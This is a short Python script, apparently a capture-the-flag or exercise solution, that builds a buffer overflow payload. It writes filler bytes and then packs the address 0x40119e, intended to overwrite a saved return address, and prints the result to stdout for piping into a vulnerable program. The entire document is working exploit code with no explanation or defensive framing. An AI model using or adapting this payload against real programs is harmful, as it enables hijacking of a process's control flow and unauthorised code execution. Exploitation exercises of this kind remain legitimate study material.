import struct
import sys

target_address = 0x40119e

# Craft the payload
payload = b'A' * 4 # Fill the buffer
payload += b'B' * 8  # Fill the additional padding
payload += struct.pack('<I', target_address)  # Overwrite the return address with the target_address

# Print the payload to the screen
sys.stdout.buffer.write(payload)
